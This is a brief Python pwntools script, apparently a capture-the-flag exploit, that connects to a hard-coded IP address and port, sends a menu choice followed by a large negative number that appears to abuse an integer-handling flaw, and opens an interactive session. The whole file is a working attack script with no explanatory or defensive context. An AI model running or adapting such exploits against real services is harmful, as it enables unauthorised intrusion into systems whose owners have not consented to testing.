from pwn import *

def exploit(host, port):
    with remote(host, port) as io:
        payload = b'2\n-999999999\n69\n'
        io.send(payload)
        io.interactive()

exploit('34.101.202.34', 10002)
